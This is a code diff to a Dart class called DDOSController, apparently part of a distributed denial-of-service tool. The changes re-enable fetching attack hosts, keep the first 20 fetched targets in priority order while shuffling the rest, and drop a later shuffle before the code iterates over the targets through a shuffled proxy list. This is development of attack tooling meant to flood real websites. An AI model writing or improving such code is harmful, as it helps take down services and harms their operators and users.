@@ -27,8 +27,8 @@ class DDOSController {
   /// Init hosts and direct targets
   Future<void> init(void Function(DDOSInfo) callback) async {
     try {
-      // callback(await _getHosts());
-      // await Future.delayed(const Duration(seconds: 1));
+      callback(await _getHosts());
+      await Future.delayed(const Duration(seconds: 1));
       callback(await _getDirectTargets());
       await Future.delayed(const Duration(seconds: 1));
       await proxiesController.fetchAll();
@@ -126,6 +126,15 @@ class DDOSController {
       for (String url in split) {
         if (url.isNotEmpty) directTargets.add(url.trim());
       }
+
+      // lets save priority of targets and save first 20 of them on their positions,
+      // rest we will shuffle
+      int max = directTargets.length > 20 ? 20 : directTargets.length;
+      List<String> temp = directTargets.getRange(0, max).toList();
+      directTargets.removeWhere((element) => temp.contains(element));
+      directTargets.shuffle();
+      directTargets.addAll(temp);
+      directTargets = directTargets.reversed.toList();
 
       return DDOSInfo(
         msg: directFound.replaceAll("COUNT", directTargets.length.toString()),
@@ -269,7 +278,6 @@ class DDOSController {
     List<Proxy> proxies = proxiesController.proxies;
     // let's shuffle them
     proxies.shuffle();
-    directTargets.shuffle();
 
     for (String target in directTargets) {
       try {
